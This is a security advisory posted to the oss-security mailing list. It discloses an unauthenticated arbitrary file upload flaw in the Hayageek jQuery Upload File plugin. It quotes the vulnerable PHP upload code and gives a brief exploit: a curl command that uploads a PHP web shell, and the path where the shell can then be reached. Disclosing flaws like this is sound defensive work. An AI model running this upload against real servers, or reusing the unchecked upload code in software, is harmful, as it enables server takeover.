  oss-security - Arbitrary file upload vulnerability in jQuery Upload File            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 20 Nov From: "Larry W. Cashdollar" <larry0@...com> To: Open Security <oss-security@...ts.openwall.com> Subject: Arbitrary file upload vulnerability in jQuery Upload File  Title: Arbitrary file upload vulnerability in Hayageek jQuery Upload File Author: Larry W. Cashdollar, @_larry0 CVE-ID:[ arbitrary file upload Download Site: http://hayageek.com/docs/jquery-upload-file.php Vendor: Hayageek Vendor Vendor Contact: hayageek@...il.com  Description: jQuery Upload File plugin provides Multiple file Uploads with progress bar.Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.  Vulnerability: The code in https://github.com/hayageek/jquery-upload-file/blob/master/php/upload.php doesn't check for a file type or for requiring any authentication allowing a user to upload an executable file to the /uploads/ directory if it exists. if(!is_array($_FILES["myfile"]["name"])) //single file { $fileName = $_FILES["myfile"]["name"]; move_uploaded_file($_FILES["myfile"]["tmp_name"],$output_dir.$fileName); $ret[]= $fileName; } else //Multiple files, file[] { $fileCount = count($_FILES["myfile"]["name"]); for($i=0; $i < $fileCount; $i++) { $fileName = $_FILES["myfile"]["name"][$i]; move_uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName); $ret[]= $fileName; }  Exploit Code: 1. $ curl  -F  "myfile=@...ll.php" "http://example.com/jquery-upload-file/php/upload.php" 2. ["shell.php"] 3.   4. Where shell is https://github.com/lcashdol/shittyshell/blob/master/shittyshell.php 5.   6.   7. Shell is located http://example.com/jquery-upload-file/php/uploads/shell.php     Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      